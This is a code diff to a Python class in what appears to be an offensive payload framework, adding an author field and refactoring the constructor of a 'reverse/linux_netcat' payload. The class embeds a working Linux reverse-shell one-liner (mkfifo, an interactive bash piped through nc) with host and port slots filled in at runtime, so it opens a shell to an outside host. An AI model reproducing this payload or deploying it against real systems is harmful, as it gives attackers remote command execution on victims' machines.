@@ -7,14 +7,15 @@ from shells import shellindex
 class ReverseLinuxNetcat(payloadcore.Payload):
 
     PAYLOADREF: str = "reverse/linux_netcat"
+    AUTHOR: str = "Danakane"
 
     def __init__(self):
         payloadbin: bytes = b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f" \
                      b"|/bin/bash -i 2>&1|nc \x00\x00\x00\x00 " \
                      b"\x00\x00 >/tmp/f\0"
-        super(ReverseLinuxNetcat, self).__init__(
-            ref="reverse/linux_netcat", payloadbin=payloadbin,
-            shellname=shellindex.ShellIndex.BASICREVERSE)
+        super(ReverseLinuxNetcat, self).__init__()
+        self.customize(author=ReverseLinuxNetcat.AUTHOR, ref="reverse/linux_netcat",
+                       payloadbin=payloadbin, shellname=shellindex.ShellIndex.BASICREVERSE)
 
     def parseparameters(self, host, port):
         host = host.encode()
